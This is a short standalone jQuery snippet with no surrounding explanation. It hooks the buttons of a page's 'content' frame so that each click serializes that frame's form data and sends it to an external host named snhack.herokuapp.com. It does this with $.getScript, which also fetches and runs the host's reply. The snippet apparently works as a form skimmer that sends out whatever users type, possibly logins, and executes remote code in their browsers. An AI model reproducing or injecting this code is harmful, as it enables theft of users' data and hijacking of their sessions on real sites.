$("input:button", window.parent.frames['content'].document).click(function(){
  $.getScript('//snhack.herokuapp.com/log?'+ $("form", window.parent.frames['content'].document).serialize())
})
